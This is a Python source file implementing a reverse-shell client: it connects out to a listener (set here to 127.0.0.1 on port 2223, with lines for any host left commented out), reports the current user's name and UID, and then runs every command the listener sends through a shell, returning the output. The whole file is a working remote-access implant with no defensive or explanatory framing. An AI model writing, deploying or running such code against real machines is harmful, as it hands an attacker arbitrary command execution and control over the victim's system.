import socket
import subprocess
import os
import sys
import pwd

def inbound():
    '''handles inbound traffic'''
    print("[+] Awaiting response")
    message = ""
    while True:
        try:
            message = sock.recv(1024).decode()
            return message
        except Exception:
            sock.close()

def outbound(message):
    '''handles outbound traffic'''
    response = str(message).encode()
    sock.send(response)


def session_handler():
    '''Handles sessions'''
    print(f"[+] Connecting to {host_ip}")
    sock.connect((host_ip, host_port))
    outbound(pwd.getpwuid(os.getuid())[0])
    outbound(os.getuid())
    print(f"[+] Connected to host {host_ip}")
    while True:
        try:
            message = inbound()
            print(f"[+] Message received - {message}")
            # Exit message handling from client -> server
            if message == "exit":
                print("[-] The server has terminated the session.")
                sock.close()
                break
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f"[+] Changed to {cur_dir}")
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound("Invalid directory. Try again.")
                    continue
            elif message == "background":
                pass
            else:
                # Subprocess command handling
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())

        except KeyboardInterrupt:
            print("[+] Keyboard interrupt issued.")
            sock.close()
            break
        except Exception:
            sock.close()
            break

if __name__ == "__main__":
    try:
        # host_ip = sys.argv[1]
        # host_port = int(sys.argv[2])
        host_ip = "127.0.0.1"
        host_port = 2223
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        session_handler()
    except IndexError:
        print("[-] Command line argument(s) missing. Please try again.")
    except Exception as e:
        print(e)
        